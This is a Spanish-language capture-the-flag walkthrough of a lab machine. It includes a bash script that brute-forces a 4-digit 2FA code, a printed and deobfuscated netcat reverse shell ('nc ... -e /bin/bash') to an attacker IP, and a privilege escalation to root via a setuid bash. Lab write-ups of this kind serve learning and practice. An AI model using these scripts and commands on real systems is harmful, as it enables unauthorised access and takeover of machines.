## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un índex de Apache pero inspeccionando el código, una variable de CSS se ve rara:

```css
    background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
```

Es una string en Base64:

```bash
echo "UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU" | base64 -d
PASSWORDADMINSUPERSECRET
```

Y hasta abajo del código hay un dominio:

```bash
http://lifeordead.dl
```

Dentro hay un admin login panel, que con el usuario admin y la contraseña que encontré se puede acceder.

Dentro hay un 2FA que pide un código de 4 dígitos para acceder y tenemos 10 intentos antes de que se bloquee. Por lo que le hare fuerza bruta.

Primero encuentro que la solicitud POST la hace a:

```bash
http://lifeordead.dl/pageadmincodeloginvalidation.php
```

Así que sabiendo eso creo el script:

```bash
#!/bin/bash

echo -e "Verificando que exista el binario seq..."
if ! command -v seq > /dev/null &>/dev/null; then
  echo -e "El binario seq no existe, instalelo y vuelva a intentar"
fi

ls number_wordlist > /dev/null &>/dev/null
if [ $? != "0" ]; then
  echo -e "La wordlist no existe, procediendo con la creación"
  seq -f "%04g" 1 9999 > number_wordlist
else
  echo -e "La wordlist existe... continuando"
fi

salir(){
  echo -e "Saliendo..."
  rm ./number_wordlist
  exit 0
}

wordlist="./number_wordlist"
intentos=0
lineas=$(wc -l number_wordlist | awk '{print $1}')

while read -r number; do
  if [ $(curl -X POST "http://lifeordead.dl/pageadmincodeloginvalidation.php" -d "code=$number" -s /dev/null | grep -c failed) != 1 ]; then
    echo -e "Código encontrado: $number"
    rm ./number_wordlist
    exit 0
  fi
  intentos=$(($intentos+1))
  echo -ne "$intentos/$lineas\r"
done < "$wordlist"
```

```bash
bash 2FAExploit.sh
# Info:
Código encontrado: 0081
```

Al ingresarlo nos da un hash:

```bash
bbb2c5e63d2ef893106fdd0d797aa97a
```

Utilizo Crackstation y nos da una contraseña:

```bash
supersecretpassword
```

Viendo el código fuente hasta abajo hay un mensaje:

```bash
<!--dimer-->
```

Siendo este el usuario SSH.

## Escalada dimer → bilter

```bash
sudo -l
(bilter : bilter) NOPASSWD: /opt/life.sh
```

Tenemos este script:

```bash
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash &>/dev/null &
```

El script es un payload de Bash para crear una Reverse Shell. Intenta conectarse de vuelta a una dirección IP y un puerto específicos para darle control remoto del sistema a un atacante.

El código esta deofuscado, si quitamos las operaciones matemáticas redundantes y las variables intermedias, el script se reduce a una sola línea de ejecución real:

Configura el job control de Bash (en silencio) 

```bash
set +m
```

Ejecuta una conexión de red inversa en segundo plano:

```bash
nc 172.17.0.186 6068 -e /bin/bash &>/dev/null &
```

¿Cómo funciona la deofuscación? 

El script utiliza operaciones lógicas XOR (^) y manipulación de bits para ocultar la dirección IP y el puerto. La propiedad clave del XOR es que si aplicas X ^ Y ^ X, regresas al valor original Y.

1. Descifrando la IP y el Puerto
    
    La Variable $a (IP): El script hace v1=$((0xCAFEBABE ^ 0xAC1100BA)) y luego a=$((v1 ^ 0xCAFEBABE)). Como se aplica XOR dos veces con el mismo valor (0xCAFEBABE), se cancelan mutuamente. Por lo tanto, $a es simplemente el número hexadecimal 0xAC1100BA.
    
    La Variable $b (Puerto): Pasa exactamente lo mismo. v2 aplica XOR con 0xDEADBEEF, y luego $b lo vuelve a aplicar. El valor real de $b es 0x17B4. En sistema decimal, 0x17B4 equivale al puerto 6068.
    
2. Conversión de la Dirección IP ($c)

La variable $c toma el valor hexadecimal de $a (0xAC1100BA) y lo divide en 4 bloques de 8 bits (bytes) usando desplazamientos de bits (>>) y máscaras (& 0xFF). Esto convierte el número en una dirección IP estándar:

```
0xAC → 172

0x11 → 17

0x00 → 0

0xBA → 186
```

Por lo tanto, $c (que luego se asigna a $g) es la IP 172.17.0.186.

  3. El Comando Oculto ($e $g $h $f)

Finalmente, el script junta las piezas asignando letras simples a las variables:

```bash
$e      nc      El comando Netcat, una herramienta de red.
$g      172.17.0.186    La dirección IP del atacante.
$h      6068    El puerto de escucha del atacante.
$f      -e      El parámetro de Netcat para ejecutar un programa tras conectar.
```

La línea final $e $g $h $f /bin/bash &>/dev/null & se traduce textualmente como:

```
nc 172.17.0.186 6068 -e /bin/bash
```

El &>/dev/null & final se encarga de redirigir cualquier error o salida a la nada y mandar el proceso al segundo plano para que la víctima no note que el script se está ejecutando.

Después de la deofuscacion toca cambiar la mi IP de Docker0:

```bash
sudo ip address del 172.17.0.1/16 dev docker0
sudo ip address add 172.17.0.186/16 dev docker0
```

Me pongo en escucha:

```bash
nc -lnvp 6068
```

Ejecuto el script y recibo una conexión.

## Escalada bilter → purter

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
```

Al ejecutar el script solo devuelve un número: 161

Después de investigar que era veo que es una referencia a un puerto. 

Por lo que desde la máquina host le hago un scan con Nmap:

```bash
sudo nmap -sU -p161 172.17.0.2 -sV -sC
```

Es snmp, pruebo Snmpwalk:

```bash
snmpwalk -v 1 -c public 172.17.0.2
```

Encuentro:

```bash
aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=

echo "aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=" | base64 -d
# Info
imposiblepassworduserfinal
```

Es la contraseña de purter.

## Escalada purter → root

```bash
sudo -l
(ALL : ALL) NOPASSWD: /home/purter/.script.sh
```

No se puede editar, pero como el script está en la carpeta /home del usuario actual lo borro y creo uno nuevo:

```bash
rm /home/purter/.script.sh
nano /home/purter/.script.sh

#!/bin/bash
chmod u+s /bin/bash
```

Le doy permisos y lo ejecuto:

```bash
chmod +x /home/purter/.script.sh
sudo /home/purter/.script.sh
```

```bash
bash -p
```

Listo.
